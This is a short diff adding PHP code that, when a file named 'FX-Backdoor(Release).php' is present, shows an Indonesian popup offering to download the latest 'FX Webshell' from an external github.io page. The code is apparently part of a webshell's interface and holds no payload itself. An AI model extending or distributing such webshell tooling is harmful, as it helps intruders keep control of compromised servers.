@@ -1,0 +1,16 @@
+if(file_exists("FX-Backdoor(Release).php")){
+            echo "<script>Swal.fire({
+                title: 'Versi Terbaru FX Webshell Telah Hadir, Apakah Anda Ingin Mendowload Versi terbaru??',
+                showDenyButton: true,
+                showCancelButton: true,
+                confirmButtonText: 'Iya, Download Sekarang!!',
+                denyButtonText: `Tidak terimakasih`,
+              }).then((result) => {
+                /* Read more about isConfirmed, isDenied below */
+                if (result.isConfirmed) {
+                  window.location='https://fierzaeriez.github.io/fx.html'
+                } else if (result.isDenied) {
+                  window.location='?home'
+                }
+              })</script>";
+        }
